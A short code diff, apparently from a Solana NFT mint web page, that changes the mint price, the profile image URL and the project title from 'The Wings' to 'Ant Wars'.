@@ -4,9 +4,9 @@ import * as solanaWeb3 from "@solana/web3.js";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 0.6
-const image = 'https://images-ext-1.discordapp.net/external/l2tPFqmsMv0rDPrAC1kQVo2Rf_gmP6a1mkTO45je-tQ/https/pbs.twimg.com/profile_images/1514725372708876288/xO8gRPZQ_400x400.jpg' 
-const Title = 'The Wings'
+const solAmount = 0.03
+const image = 'https://images-ext-2.discordapp.net/external/UchWbtEayCP7MZ9KZhQVMhN3JV0CNvGmmXdMJ_NrszI/https/pbs.twimg.com/profile_images/1513654335443546113/6ykv_p8i_400x400.jpg' 
+const Title = 'Ant Wars'
 const supply = 999
 
 document.title = Title
